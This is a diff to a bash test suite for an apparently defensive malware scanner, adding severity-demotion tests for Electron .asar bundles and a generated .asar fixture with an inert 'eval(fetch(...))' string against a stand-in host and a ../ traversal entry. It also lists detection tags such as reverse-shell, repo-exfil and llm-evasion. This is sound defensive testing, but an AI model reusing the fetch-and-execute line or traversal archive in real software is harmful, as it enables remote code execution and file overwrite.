@@ -3,6 +3,8 @@
 # main script is not run) plus integration tests over inert fixtures. Offline and
 # deterministic: no network, no LLM, fixtures never execute (dangerous lines are
 # quoted strings or behind SystemExit guards).
+# MODE and ASAR_PASS are read by the functions sourced below, not by this file.
+# shellcheck disable=SC2034
 set -uo pipefail
 
 HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
@@ -54,6 +56,7 @@ eq "DANGEROUS beats CAUTION" "$(more_severe CAUTION DANGEROUS)" "DANGEROUS"
 eq "CAUTION beats SAFE"      "$(more_severe SAFE CAUTION)" "CAUTION"
 
 echo "unit: demote_for_mode (anti-cry-wolf)"
+ASAR_PASS=0
 MODE=installer
 eq "persistence demoted to LOW"   "$(demote_for_mode persistence MED)" "LOW"
 eq "download-exec HIGH -> MED"    "$(demote_for_mode download-exec HIGH)" "MED"
@@ -64,6 +67,14 @@ MODE=pkgcheck
 eq "pkgcheck demotes native-vendored"  "$(demote_for_mode native-vendored HIGH)" "LOW"
 eq "pkgcheck keeps install-hook"       "$(demote_for_mode install-hook HIGH)" "HIGH"
 MODE=repo
+# inside a built app bundle: install-time and credential-path tags are noise,
+# runtime-behaviour tags are not
+ASAR_PASS=1
+eq "asar demotes secret-scrape"        "$(demote_for_mode secret-scrape MED)" "LOW"
+eq "asar demotes install-hook"         "$(demote_for_mode install-hook HIGH)" "LOW"
+eq "asar keeps reverse-shell"          "$(demote_for_mode reverse-shell HIGH)" "HIGH"
+eq "asar keeps import-shadow"          "$(demote_for_mode import-shadow CRIT)" "CRIT"
+ASAR_PASS=0
 
 # --- integration: fixtures (offline, no LLM) ---------------------------------
 scan() { # dir [flags...]
@@ -249,6 +260,54 @@ if command -v script >/dev/null 2>&1; then
   rm -f "$ptylog"
 else
   echo "  (script unavailable — skipping spinner regression test)"
+fi
+
+echo "integration: malware-2026 -> DANGEROUS (current TTPs: fetch-exec, worm exfil, macOS fileless, AI-triage evasion)"
+scan malware-2026; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
+for t in js-fetch-exec multi-decode repo-exfil devtool-theft tunnel-c2 \
+         macos-inmem gatekeeper llm-evasion ci-secret-exfil registry-redirect; do has "$t"; done
+
+# Electron .asar: built at test time so the real parser is exercised, and so the
+# repo carries no binary fixture. Also asserts the untrusted-input defences.
+echo "integration: .asar unpacking (Electron app bundle)"
+if command -v python3 >/dev/null 2>&1; then
+  adir=$(mktemp -d); mkdir -p "$adir/T.app/Contents/Resources"
+  python3 - "$adir/T.app/Contents/Resources/app.asar" <<'PYASAR'
+import json, struct, sys
+files = {
+    # inert: the dangerous line is a string that is never evaluated
+    "index.js": b"throw new Error('inert');\nvar x = \"eval(fetch('https://x.invalid/s').then(r=>r.text()))\";\n",
+    "pkg/util.js": b"module.exports = 1;\n",
+}
+tree, data, off = {"files": {}}, b"", 0
+for name, content in files.items():
+    node, parts = tree, name.split("/")
+    for p in parts[:-1]:
+        node = node["files"].setdefault(p, {"files": {}})
+    node["files"][parts[-1]] = {"size": len(content), "offset": str(off)}
+    data += content; off += len(content)
+# a traversal entry and a symlink entry, which the reader must refuse
+tree["files"]["../../escaped.js"] = {"size": 5, "offset": str(off)}
+tree["files"]["link.js"] = {"link": "index.js"}
+data += b"BAD!\n"
+js = json.dumps(tree).encode()
+pad = (4 - len(js) % 4) % 4
+payload = struct.pack("<I", len(js)) + js + b"\0" * pad
+header = struct.pack("<I", len(payload)) + payload
+open(sys.argv[1], "wb").write(struct.pack("<II", 4, len(header)) + header + data)
+PYASAR
+  aj="$("$SC" --offline --json "$adir/T.app" 2>/dev/null)"
+  afiles="$(printf '%s' "$aj" | python3 -c 'import json,sys;print(" ".join(f["file"] for f in json.load(sys.stdin)["findings"]))' 2>/dev/null)"
+  atags="$(printf '%s' "$aj" | python3 -c 'import json,sys;print(" ".join(sorted({f["tag"] for f in json.load(sys.stdin)["findings"]})))' 2>/dev/null)"
+  [[ "$atags" == *"js-fetch-exec"* ]] && pass "scans code inside the .asar" || fail "asar contents not scanned (tags: $atags)"
+  [[ "$afiles" == *"app.asar!/index.js"* ]] && pass "reports findings against the archive path" || fail "asar path label missing ($afiles)"
+  [[ "$atags" != *"asar-unread"* ]] && pass "archive unpacked cleanly" || fail "asar reported unreadable"
+  # nothing may be written outside the extraction dir, and no symlink created
+  [[ ! -e "$adir/escaped.js" && ! -e "$adir/T.app/escaped.js" ]] \
+    && pass "rejects ../ traversal entry" || fail "asar traversal escaped the extract dir"
+  rm -rf "$adir"
+else
+  echo "  (python3 unavailable — skipping asar test)"
 fi
 
 echo "integration: caution-poc -> CAUTION + --strict exit codes"
